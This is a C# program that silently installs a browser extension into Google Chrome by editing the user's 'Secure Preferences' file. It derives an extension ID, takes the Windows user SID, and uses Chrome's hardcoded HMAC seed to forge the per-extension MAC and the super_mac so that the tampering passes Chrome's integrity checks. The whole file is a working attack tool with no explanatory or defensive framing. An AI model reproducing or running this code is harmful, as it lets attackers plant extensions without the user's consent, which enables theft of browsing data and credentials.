using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

public class Program
{
    public static void Main(string[] args)
    {
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: ProgramName <path>");
            return;
        }
        string defaultExtensionInfo = "ReadMe.txt";
        string extensionsPath = args[0];
        string defaultReadMePath = Path.Combine(extensionsPath, defaultExtensionInfo);
        if (!File.Exists(defaultReadMePath))
        {
            return;
        }
        string extId = ComputeExtensionId(extensionsPath);
        string userName = GetUserName();
        string extensionInfo = File.ReadAllText(defaultReadMePath);
        string newExtensionInfo = extensionInfo.Replace("<<path>>", extensionsPath.Replace(@"\", @"\\"));
        string path = $"extensions.settings.{extId}";
        WindowsIdentity identity = WindowsIdentity.GetCurrent();
        string sid = ExtractPrefixSid(identity.User.Value);
        byte[] seed = new byte[] { 0xE7, 0x48, 0xF3, 0x36, 0xD8, 0x5E, 0xA5, 0xF9, 0xDC, 0xDF, 0x25, 0xD8, 0xF3, 0x47, 0xA6, 0x5B, 0x4C, 0xDF, 0x66, 0x76, 0x00, 0xF0, 0x2D, 0xF6, 0x72, 0x4A, 0x2A, 0xF1, 0x8A, 0x21, 0x2D, 0x26, 0xB7, 0x88, 0xA2, 0x50, 0x86, 0x91, 0x0C, 0xF3, 0xA9, 0x03, 0x13, 0x69, 0x68, 0x71, 0xF3, 0xDC, 0x05, 0x82, 0x37, 0x30, 0xC9, 0x1D, 0xF8, 0xBA, 0x5C, 0x4F, 0xD9, 0xC8, 0x84, 0xB5, 0x05, 0xA8 };
        string hmac = CalculateHMAC(newExtensionInfo, path, sid, seed);
        string filepath = $"C:\\users\\{userName}\\appdata\\local\\Google\\Chrome\\User Data\\Default\\Secure Preferences";
        var data = JsonConvert.DeserializeObject<JObject>(File.ReadAllText(filepath));
        JObject jobj = JObject.Parse(newExtensionInfo);
        data["extensions"]["settings"][extId] = jobj;
        data["protection"]["macs"]["extensions"]["settings"][extId] = hmac;
        string supermac = CalcSuperMac(data, sid, seed);
        data["protection"]["super_mac"] = supermac;
        File.WriteAllText(filepath, JsonConvert.SerializeObject(data));
        
    }
    public static string ExtractPrefixSid(string fullSid)
    {
        int lastDashIndex = fullSid.LastIndexOf('-');

        if (lastDashIndex != -1)
        {
            return fullSid.Substring(0, lastDashIndex);
        }
        return fullSid;
    }
    static string ComputeExtensionId(string path)
    {
        using (SHA256 sha256 = SHA256.Create())
        {
            byte[] pathBytes = Encoding.Unicode.GetBytes(path);

            byte[] hashBytes = sha256.ComputeHash(pathBytes);
            string hexHash = BitConverter.ToString(hashBytes).Replace("-", "").ToLower();

            StringBuilder extIdBuilder = new StringBuilder();
            foreach (char c in hexHash)
            {
                int charValue = Convert.ToInt32(c.ToString(), 16);
                extIdBuilder.Append((char)((charValue % 26) + 'a'));
                if (extIdBuilder.Length >= 32)
                    break;
            }

            string extId = extIdBuilder.ToString();

            return extId;
        }
    }
    public static string GetUserName()
    {
        WindowsIdentity windowsIdentity = WindowsIdentity.GetCurrent();

        if (windowsIdentity != null)
        {
            string userName = windowsIdentity.Name;
            int index = userName.IndexOf("\\");
            if (index != -1)
            {
                userName = userName.Substring(index + 1);
            }

            return userName;
        }
        else
        {
            return null;
        }
    }
    public static string GenerateRandomString(int length)
    {
        const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        Random random = new Random();
        char[] stringChars = new char[length];

        for (int i = 0; i < length; i++)
        {
            stringChars[i] = chars[random.Next(chars.Length)];
        }

        return new string(stringChars);
    }

    public static string CalculateHMAC(string jsonString, string path, string sid, byte[] seed)
    {
        JObject jsonObject = JObject.Parse(jsonString);
        RemoveEmpty(jsonObject);

        string processedJsonString = JsonConvert.SerializeObject(jsonObject, Formatting.None, new JsonSerializerSettings
        {
            StringEscapeHandling = StringEscapeHandling.EscapeNonAscii
        }).Replace("<", "\\u003C").Replace("\\u2122", "™");

        string message = sid + path + processedJsonString;
        using (HMACSHA256 hmac = new HMACSHA256(seed))
        {
            byte[] hashValue = hmac.ComputeHash(Encoding.UTF8.GetBytes(message));
            return BitConverter.ToString(hashValue).Replace("-", "").ToUpper();
        }
    }
    private static string CalcSuperMac(JObject data, string sid, byte[] seed)
    {
        var protection = data["protection"] as JObject;
        var macs = protection["macs"] as JObject;
        var superMsg = sid + JsonConvert.SerializeObject(macs).Replace(" ", "");
        Console.WriteLine(superMsg);
        using (var hmac = new HMACSHA256(seed))
        {
            byte[] hashValue = hmac.ComputeHash(Encoding.UTF8.GetBytes(superMsg));
            return BitConverter.ToString(hashValue).Replace("-", "").ToUpper();
        }
    }
    private static void RemoveEmpty(JToken token)
    {
        if (token.Type == JTokenType.Object)
        {
            var obj = (JObject)token;
            var propertiesToRemove = new List<JProperty>();

            foreach (var prop in obj.Properties())
            {
                RemoveEmpty(prop.Value);
                if (IsEmpty(prop.Value))
                {
                    propertiesToRemove.Add(prop);
                }
            }

            foreach (var prop in propertiesToRemove)
            {
                prop.Remove();
            }
        }
        else if (token.Type == JTokenType.Array)
        {
            var array = (JArray)token;
            var itemsToRemove = new List<JToken>();

            foreach (var item in array)
            {
                RemoveEmpty(item);
                if (IsEmpty(item))
                {
                    itemsToRemove.Add(item);
                }
            }

            foreach (var item in itemsToRemove)
            {
                item.Remove();
            }
        }
    }

    private static bool IsEmpty(JToken token)
    {
        if (token.Type == JTokenType.Object)
        {
            return !token.HasValues;
        }
        if (token.Type == JTokenType.Array)
        {
            return !token.HasValues;
        }
        if (token.Type == JTokenType.String)
        {
            return string.IsNullOrEmpty(token.ToString());
        }
        if (token.Type == JTokenType.Null)
        {
            return true;
        }
        return false;
    }
}